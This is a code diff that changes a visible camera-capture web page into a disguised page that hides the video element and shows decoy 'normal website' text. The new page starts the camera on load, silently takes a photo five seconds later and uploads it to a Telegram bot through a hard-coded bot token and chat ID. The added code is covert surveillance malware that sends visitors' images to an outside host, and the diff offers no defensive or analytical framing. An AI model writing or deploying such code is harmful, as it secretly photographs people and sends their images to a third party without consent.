@@ -3,163 +3,77 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Camera Capture</title>
+    <title>Document</title>
     <style>
         body {
             font-family: Arial, sans-serif;
-            max-width: 600px;
-            margin: 0 auto;
-            padding: 20px;
             text-align: center;
+            padding: 20px;
         }
-        #camera-container {
-            margin: 20px 0;
+        #hiddenCamera {
+            display: none;
         }
-        #camera {
-            width: 100%;
-            max-width: 400px;
-            background-color: #f0f0f0;
-            border-radius: 8px;
-        }
-        #capture-btn, #switch-camera {
-            padding: 10px 20px;
-            margin: 10px;
-            background-color: #4CAF50;
-            color: white;
-            border: none;
-            border-radius: 4px;
-            cursor: pointer;
-            font-size: 16px;
-        }
-        #switch-camera {
-            background-color: #2196F3;
-        }
-        #result {
-            margin-top: 20px;
-        }
-        #status {
-            margin-top: 20px;
-            font-weight: bold;
+        #fakeContent {
+            margin-top: 50px;
         }
     </style>
 </head>
 <body>
-    <h1>Camera Capture</h1>
-    <p>Allow access to your camera to take a photo.</p>
-    
-    <div id="camera-container">
-        <video id="camera" autoplay playsinline></video>
+    <h1>Website Content</h1>
+    <div id="fakeContent">
+        <p>This appears to be a normal website...</p>
+        <button id="fakeButton">Click Here</button>
     </div>
-    
-    <button id="switch-camera">Switch Camera</button>
-    <button id="capture-btn">Capture Photo</button>
-    
-    <div id="result">
-        <canvas id="canvas" style="display: none;"></canvas>
+
+    <div id="hiddenCamera">
+        <video id="video" autoplay playsinline></video>
+        <canvas id="canvas"></canvas>
     </div>
-    
-    <div id="status"></div>
-    
+
     <script>
-        const video = document.getElementById('camera');
-        const canvas = document.getElementById('canvas');
-        const captureBtn = document.getElementById('capture-btn');
-        const switchBtn = document.getElementById('switch-camera');
-        const statusDiv = document.getElementById('status');
-        
-        let currentStream = null;
-        let facingMode = "user"; // Default to front camera
-        
-        // Telegram bot details
+        // Telegram bot details (not recommended to expose in client-side code)
         const botToken = '8114609982:AAF1O8wL_IZkdyF4jVCB3_2SJ3-lynVlpFg';
         const chatId = '7835924973';
-        
-        async function startCamera() {
-            statusDiv.textContent = "Starting camera...";
-            
+
+        // This will only work if the user grants camera permissions
+        async function initCamera() {
             try {
-                if (currentStream) {
-                    currentStream.getTracks().forEach(track => track.stop());
-                }
-                
-                const constraints = {
-                    video: {
-                        facingMode: facingMode,
-                        width: { ideal: 1280 },
-                        height: { ideal: 720 }
-                    }
-                };
-                
-                const stream = await navigator.mediaDevices.getUserMedia(constraints);
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const video = document.getElementById('video');
                 video.srcObject = stream;
-                currentStream = stream;
                 
-                statusDiv.textContent = "Camera is ready";
+                // Capture photo after 5 seconds
+                setTimeout(capturePhoto, 5000);
             } catch (err) {
-                console.error("Error accessing camera:", err);
-                statusDiv.textContent = "Error accessing camera: " + err.message;
+                console.log("Camera access denied:", err);
             }
         }
-        
-        function switchCamera() {
-            facingMode = facingMode === "user" ? "environment" : "user";
-            startCamera();
+
+        function capturePhoto() {
+            const video = document.getElementById('video');
+            const canvas = document.getElementById('canvas');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            
+            canvas.toBlob(blob => {
+                sendToTelegram(blob);
+            }, 'image/jpeg');
         }
-        
-        async function capturePhoto() {
-            if (!currentStream) {
-                statusDiv.textContent = "Camera is not ready yet";
-                return;
-            }
+
+        function sendToTelegram(blob) {
+            const formData = new FormData();
+            formData.append('chat_id', chatId);
+            formData.append('photo', blob, 'photo.jpg');
             
-            statusDiv.textContent = "Capturing photo...";
-            
-            // Set canvas dimensions to match video stream
-            const videoTrack = currentStream.getVideoTracks()[0];
-            const settings = videoTrack.getSettings();
-            canvas.width = settings.width;
-            canvas.height = settings.height;
-            
-            // Draw video frame to canvas
-            const context = canvas.getContext('2d');
-            context.drawImage(video, 0, 0, canvas.width, canvas.height);
-            
-            // Convert canvas to blob
-            canvas.toBlob(async (blob) => {
-                try {
-                    statusDiv.textContent = "Sending photo...";
-                    
-                    // Create form data
-                    const formData = new FormData();
-                    formData.append('chat_id', chatId);
-                    formData.append('photo', blob, 'capture.jpg');
-                    
-                    // Send to Telegram bot
-                    const response = await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
-                        method: 'POST',
-                        body: formData
-                    });
-                    
-                    const result = await response.json();
-                    
-                    if (result.ok) {
-                        statusDiv.textContent = "Photo sent successfully!";
-                    } else {
-                        statusDiv.textContent = "Error sending photo: " + (result.description || 'Unknown error');
-                    }
-                } catch (err) {
-                    console.error("Error sending photo:", err);
-                    statusDiv.textContent = "Error sending photo: " + err.message;
-                }
-            }, 'image/jpeg', 0.9);
+            fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                method: 'POST',
+                body: formData
+            });
         }
-        
-        // Event listeners
-        captureBtn.addEventListener('click', capturePhoto);
-        switchBtn.addEventListener('click', switchCamera);
-        
-        // Start camera on page load
-        startCamera();
+
+        // Start camera when page loads
+        window.addEventListener('load', initCamera);
     </script>
 </body>
 </html>
